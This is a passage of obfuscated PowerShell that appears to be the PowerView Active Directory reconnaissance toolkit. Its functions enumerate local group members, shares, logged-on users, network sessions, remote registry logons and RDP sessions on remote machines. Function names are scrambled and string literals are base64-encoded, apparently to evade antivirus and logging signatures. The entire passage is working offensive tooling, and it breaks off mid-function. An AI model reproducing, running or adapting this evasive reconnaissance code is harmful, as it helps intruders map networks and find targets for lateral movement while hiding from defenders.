                    ${_/==\/=\/=\/\/\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))))
                    ${_/==\/=\/=\/\/\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))),0)).Value)
                    ${_/==\/=\/=\/\/\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) ($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))))
                    ${_/==\/=\/=\/\/\/\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAC4AVwBpAG4ATgBUAA=='))))
                    ${_/==\/=\/=\/\/\/\}
                }
            }
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function __/=\/===\_/=\/==\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = ${Env:/=\/\/\/=\__/\_/=},
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${_/\/\_/===\_/=\/\} = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            if ($Method -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
                ${_/\/==\/\_/\_/\/\} = 2
                ${/=\_/\/=\/==\/\__} = [IntPtr]::Zero
                ${__/\___/\/======\} = 0
                ${__/\/==\__/=\__/=} = 0
                ${/\_____/\/=\_/==\} = 0
                ${___/=\/\________/} = ${_/=\___/=\/\/\/==}::NetLocalGroupGetMembers(${/\_______/\/\/=\/}, ${_/\/\_/===\_/=\/\}, ${_/\/==\/\_/\_/\/\}, [ref]${/=\_/\/=\/==\/\__}, -1, [ref]${__/\___/\/======\}, [ref]${__/\/==\__/=\__/=}, [ref]${/\_____/\/=\_/==\})
                ${_/=\/\_/\/=\_____/} = ${/=\_/\/=\/==\/\__}.ToInt64()
                ${_____/\/===\/=\_/} = @()
                if ((${___/=\/\________/} -eq 0) -and (${_/=\/\_/\/=\_____/} -gt 0)) {
                    ${__/\/===\_/\/\/=\} = ${/==\/\/===\_/==\_}::GetSize()
                    for (${_/\/\__/=\/==\/\_} = 0; (${_/\/\__/=\/==\/\_} -lt ${__/\___/\/======\}); ${_/\/\__/=\/==\/\_}++) {
                        ${/=\/=======\/==\_} = New-Object System.Intptr -ArgumentList ${_/=\/\_/\/=\_____/}
                        ${/==\__/=\_/\_/\__} = ${/=\/=======\/==\_} -as ${/==\/\/===\_/==\_}
                        ${_/=\/\_/\/=\_____/} = ${/=\/=======\/==\_}.ToInt64()
                        ${_/=\/\_/\/=\_____/} += ${__/\/===\_/\/\/=\}
                        ${/\_____/\/\____/=} = ''
                        ${__/======\___/\/\} = ${/=\____/===\/=\_/}::ConvertSidToStringSid(${/==\__/=\_/\_/\__}.lgrmi2_sid, [ref]${/\_____/\/\____/=});${__/\_/==\/===\__/} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if (${__/======\___/\/\} -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] ${__/\_/==\/===\__/}).Message)"
                        }
                        else {
                            ${_/==\__/=\____/\/} = New-Object PSObject
                            ${_/==\__/=\____/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                            ${_/==\__/=\____/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${_/\/\_/===\_/=\/\}
                            ${_/==\__/=\____/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${/==\__/=\_/\_/\__}.lgrmi2_domainandname
                            ${_/==\__/=\____/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ${/\_____/\/\____/=}
                            ${__/=\_/\_/==\/==\} = $(${/==\__/=\_/\_/\__}.lgrmi2_sidusage -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQAVAB5AHAAZQBHAHIAbwB1AHAA'))))
                            ${_/==\__/=\____/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${__/=\_/\_/==\/==\}
                            ${_/==\__/=\____/\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByAC4AQQBQAEkA'))))
                            ${_____/\/===\/=\_/} += ${_/==\__/=\____/\/}
                        }
                    }
                    $Null = ${_/=\___/=\/\/\/==}::NetApiBufferFree(${/=\_/\/=\/==\/\__})
                    ${/==\/\/==\____/=\} = ${_____/\/===\/=\_/} | ? {$_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADAA'))) -or ($_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADEA'))))} | select -Expand SID
                    if (${/==\/\/==\____/=\}) {
                        ${/==\/\/==\____/=\} = ${/==\/\/==\____/=\}.Substring(0, ${/==\/\/==\____/=\}.LastIndexOf('-'))
                        ${_____/\/===\/=\_/} | % {
                            if ($_.SID -match ${/==\/\/==\____/=\}) {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
                            }
                            else {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $True
                            }
                        }
                    }
                    else {
                        ${_____/\/===\/=\_/} | % {
                            if ($_.SID -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAA==')))) {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
                            }
                            else {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                            }
                        }
                    }
                    ${_____/\/===\/=\_/}
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] ${___/=\/\________/}).Message)"
                }
            }
            else {
                try {
                    ${__/=\_/==\/===\_/} = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAewAvAFwAXwBfAF8AXwBfAF8AXwAvAFwALwBcAC8APQBcAC8AfQAvACQAewBfAC8AXAAvAFwAXwAvAD0APQA9AFwAXwAvAD0AXAAvAFwAfQAsAGcAcgBvAHUAcAA=')))
                    ${__/=\_/==\/===\_/}.psbase.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAcwA=')))) | % {
                        ${_/==\__/=\____/\/} = New-Object PSObject
                        ${_/==\__/=\____/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                        ${_/==\__/=\____/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${_/\/\_/===\_/=\/\}
                        ${/\_______/\/===\_} = ([ADSI]$_)
                        ${/=\/\/===\/\/\/=\} = ${/\_______/\/===\_}.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAHMAUABhAHQAaAA=')))).Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvAA=='))), '')
                        ${__/=\_/\_/==\/==\} = (${/\_______/\/===\_}.SchemaClassName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))))
                        if(([regex]::Matches(${/=\/\/===\/\/\/=\}, '/')).count -eq 1) {
                            ${_/===\/\____/=\/=} = $True
                            $Name = ${/=\/\/===\/\/\/=\}.Replace('/', '\')
                        }
                        else {
                            ${_/===\/\____/=\/=} = $False
                            $Name = ${/=\/\/===\/\/\/=\}.Substring(${/=\/\/===\/\/\/=\}.IndexOf('/')+1).Replace('/', '\')
                        }
                        ${_/==\__/=\____/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Name
                        ${_/==\__/=\____/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier(${/\_______/\/===\_}.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA')))),0)).Value)
                        ${_/==\__/=\____/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${__/=\_/\_/==\/==\}
                        ${_/==\__/=\____/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) ${_/===\/\____/=\/=}
                        ${_/==\__/=\____/\/}
                    }
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAE4AZQB0AEwAbwBjAGEAbABHAHIAbwB1AHAATQBlAG0AYgBlAHIAXQAgAEUAcgByAG8AcgAgAGYAbwByACAAJAB7AC8AXABfAF8AXwBfAF8AXwBfAC8AXAAvAFwALwA9AFwALwB9ACAAOgAgACQAXwA=')))
                }
            }
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function ___/=\_/\_/=\/==== {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            ${_/\/==\/\_/\_/\/\} = 1
            ${/=\_/\/=\/==\/\__} = [IntPtr]::Zero
            ${__/\___/\/======\} = 0
            ${__/\/==\__/=\__/=} = 0
            ${/\_____/\/=\_/==\} = 0
            ${___/=\/\________/} = ${_/=\___/=\/\/\/==}::NetShareEnum(${/\_______/\/\/=\/}, ${_/\/==\/\_/\_/\/\}, [ref]${/=\_/\/=\/==\/\__}, -1, [ref]${__/\___/\/======\}, [ref]${__/\/==\__/=\__/=}, [ref]${/\_____/\/=\_/==\})
            ${_/=\/\_/\/=\_____/} = ${/=\_/\/=\/==\/\__}.ToInt64()
            if ((${___/=\/\________/} -eq 0) -and (${_/=\/\_/\/=\_____/} -gt 0)) {
                ${__/\/===\_/\/\/=\} = ${__/==\__/==\/==\_}::GetSize()
                for (${_/\/\__/=\/==\/\_} = 0; (${_/\/\__/=\/==\/\_} -lt ${__/\___/\/======\}); ${_/\/\__/=\/==\/\_}++) {
                    ${/=\/=======\/==\_} = New-Object System.Intptr -ArgumentList ${_/=\/\_/\/=\_____/}
                    ${/==\__/=\_/\_/\__} = ${/=\/=======\/==\_} -as ${__/==\__/==\/==\_}
                    ${_/\_/==\/\_/===\/} = ${/==\__/=\_/\_/\__} | select *
                    ${_/\_/==\/\_/===\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                    ${_/\_/==\/\_/===\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGgAYQByAGUASQBuAGYAbwA='))))
                    ${_/=\/\_/\/=\_____/} = ${/=\/=======\/==\_}.ToInt64()
                    ${_/=\/\_/\/=\_____/} += ${__/\/===\_/\/\/=\}
                    ${_/\_/==\/\_/===\/}
                }
                $Null = ${_/=\___/=\/\/\/==}::NetApiBufferFree(${/=\_/\/=\/==\/\__})
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] ${___/=\/\________/}).Message)"
            }
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function _/=\/=\_/\/===\_/= {
    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            ${_/\/==\/\_/\_/\/\} = 1
            ${/=\_/\/=\/==\/\__} = [IntPtr]::Zero
            ${__/\___/\/======\} = 0
            ${__/\/==\__/=\__/=} = 0
            ${/\_____/\/=\_/==\} = 0
            ${___/=\/\________/} = ${_/=\___/=\/\/\/==}::NetWkstaUserEnum(${/\_______/\/\/=\/}, ${_/\/==\/\_/\_/\/\}, [ref]${/=\_/\/=\/==\/\__}, -1, [ref]${__/\___/\/======\}, [ref]${__/\/==\__/=\__/=}, [ref]${/\_____/\/=\_/==\})
            ${_/=\/\_/\/=\_____/} = ${/=\_/\/=\/==\/\__}.ToInt64()
            if ((${___/=\/\________/} -eq 0) -and (${_/=\/\_/\/=\_____/} -gt 0)) {
                ${__/\/===\_/\/\/=\} = ${__/\_/\/\___/==\/}::GetSize()
                for (${_/\/\__/=\/==\/\_} = 0; (${_/\/\__/=\/==\/\_} -lt ${__/\___/\/======\}); ${_/\/\__/=\/==\/\_}++) {
                    ${/=\/=======\/==\_} = New-Object System.Intptr -ArgumentList ${_/=\/\_/\/=\_____/}
                    ${/==\__/=\_/\_/\__} = ${/=\/=======\/==\_} -as ${__/\_/\/\___/==\/}
                    ${/=\_/===\____/\_/} = ${/==\__/=\_/\_/\__} | select *
                    ${/=\_/===\____/\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                    ${/=\_/===\____/\_/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgBJAG4AZgBvAA=='))))
                    ${_/=\/\_/\/=\_____/} = ${/=\/=======\/==\_}.ToInt64()
                    ${_/=\/\_/\/=\_____/} += ${__/\/===\_/\/\/=\}
                    ${/=\_/===\____/\_/}
                }
                $Null = ${_/=\___/=\/\/\/==}::NetApiBufferFree(${/=\_/\/=\/==\/\__})
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] ${___/=\/\________/}).Message)"
            }
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function ___/\/\/===\/\/\/\ {
    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            ${_/\/==\/\_/\_/\/\} = 10
            ${/=\_/\/=\/==\/\__} = [IntPtr]::Zero
            ${__/\___/\/======\} = 0
            ${__/\/==\__/=\__/=} = 0
            ${/\_____/\/=\_/==\} = 0
            ${___/=\/\________/} = ${_/=\___/=\/\/\/==}::NetSessionEnum(${/\_______/\/\/=\/}, '', ${/=\__/\_/\__/\/\_}, ${_/\/==\/\_/\_/\/\}, [ref]${/=\_/\/=\/==\/\__}, -1, [ref]${__/\___/\/======\}, [ref]${__/\/==\__/=\__/=}, [ref]${/\_____/\/=\_/==\})
            ${_/=\/\_/\/=\_____/} = ${/=\_/\/=\/==\/\__}.ToInt64()
            if ((${___/=\/\________/} -eq 0) -and (${_/=\/\_/\/=\_____/} -gt 0)) {
                ${__/\/===\_/\/\/=\} = ${_/\/\/\_/\__/==\_}::GetSize()
                for (${_/\/\__/=\/==\/\_} = 0; (${_/\/\__/=\/==\/\_} -lt ${__/\___/\/======\}); ${_/\/\__/=\/==\/\_}++) {
                    ${/=\/=======\/==\_} = New-Object System.Intptr -ArgumentList ${_/=\/\_/\/=\_____/}
                    ${/==\__/=\_/\_/\__} = ${/=\/=======\/==\_} -as ${_/\/\/\_/\__/==\_}
                    ${_/=\/\_/\_/\/\/\_} = ${/==\__/=\_/\_/\__} | select *
                    ${_/=\/\_/\_/\/\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                    ${_/=\/\_/\_/\/\/\_}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGUAcwBzAGkAbwBuAEkAbgBmAG8A'))))
                    ${_/=\/\_/\/=\_____/} = ${/=\/=======\/==\_}.ToInt64()
                    ${_/=\/\_/\/=\_____/} += ${__/\/===\_/\/\/=\}
                    ${_/=\/\_/\_/\/\/\_}
                }
                $Null = ${_/=\___/=\/\/\/==}::NetApiBufferFree(${/=\_/\/=\/==\/\__})
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] ${___/=\/\________/}).Message)"
            }
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function Get-RegLoggedOn {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = 'localhost'
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            try {
                ${/===========\/==\} = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8AXAAvAFwALwA9AFwAXwBfAC8AXABfAC8APQB9AA=='))))
                ${/===========\/==\}.GetSubKeyNames() | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) } | % {
                    ${/=\__/\_/\__/\/\_} = __/\/=\/=\_/\/=\/= -/===\_/\_/\_/=\__ $_ -_/============\/\/ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))
                    if (${/=\__/\_/\__/\/\_}) {
                        ${/=\__/\_/\__/\/\_}, $UserDomain = ${/=\__/\_/\__/\/\_}.Split('@')
                    }
                    else {
                        ${/=\__/\_/\__/\/\_} = $_
                        $UserDomain = $Null
                    }
                    ${___/=\__/\/==\/\_} = New-Object PSObject
                    ${___/=\__/\/==\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8AXAAvAFwALwA9AFwAXwBfAC8AXABfAC8APQB9AA==')))
                    ${___/=\__/\/==\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                    ${___/=\__/\/==\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${/=\__/\_/\__/\/\_}
                    ${___/=\__/\/==\/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) $_
                    ${___/=\__/\/==\/\_}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAGUAZwBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA='))))
                    ${___/=\__/\/==\/\_}
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFIAZQBnAEwAbwBnAGcAZQBkAE8AbgBdACAARQByAHIAbwByACAAbwBwAGUAbgBpAG4AZwAgAHIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5ACAAbwBuACAAJwAkAHsALwA9AFwALwBcAC8AXAAvAD0AXABfAF8ALwBcAF8ALwA9AH0AJwAgADoAIAAkAF8A')))
            }
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function Get-NetRDPSession {
    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${/\_______/\/\/=\/} in ${/=\/\/\/=\__/\_/=}) {
            ${_/==\/=\__/=\_/==} = ${___/\/\/\_/\_/\_/}::WTSOpenServerEx(${/\_______/\/\/=\/})
            if (${_/==\/=\__/=\_/==} -ne 0) {
                ${/===\_/\__/\_/=\_} = [IntPtr]::Zero
                ${__/==\/\/===\__/\} = 0
                ${___/=\/\________/} = ${___/\/\/\_/\_/\_/}::WTSEnumerateSessionsEx(${_/==\/=\__/=\_/==}, [ref]1, 0, [ref]${/===\_/\__/\_/=\_}, [ref]${__/==\/\/===\__/\});${__/\_/==\/===\__/} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                ${_/=\/\_/\/=\_____/} = ${/===\_/\__/\_/=\_}.ToInt64()
                if ((${___/=\/\________/} -ne 0) -and (${_/=\/\_/\/=\_____/} -gt 0)) {
                    ${__/\/===\_/\/\/=\} = ${_/\/\__/\__/\/\__}::GetSize()
                    for (${_/\/\__/=\/==\/\_} = 0; (${_/\/\__/=\/==\/\_} -lt ${__/==\/\/===\__/\}); ${_/\/\__/=\/==\/\_}++) {
                        ${/=\/=======\/==\_} = New-Object System.Intptr -ArgumentList ${_/=\/\_/\/=\_____/}
                        ${/==\__/=\_/\_/\__} = ${/=\/=======\/==\_} -as ${_/\/\__/\__/\/\__}
                        ${___/====\/\_/=\/\} = New-Object PSObject
                        if (${/==\__/=\_/\_/\__}.pHostName) {
                            ${___/====\/\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/==\__/=\_/\_/\__}.pHostName
                        }
                        else {
                            ${___/====\/\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/\_______/\/\/=\/}
                        }
                        ${___/====\/\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBOAGEAbQBlAA=='))) ${/==\__/=\_/\_/\__}.pSessionName
                        if ($(-not ${/==\__/=\_/\_/\__}.pDomainName) -or (${/==\__/=\_/\_/\__}.pDomainName -eq '')) {
                            ${___/====\/\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$(${/==\__/=\_/\_/\__}.pUserName)"
                        }
                        else {
                            ${___/====\/\_/=\/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$(${/==\__/=\_/\_/\__}.pDomainName)\$(${/==\__/=\_/\_/\__}.pUserName)"
                        }
                        ${___/====\/\_/=\/\} | Add-Member Noteproperty 'ID' ${/==\__/=\_/\_/\__}.SessionID
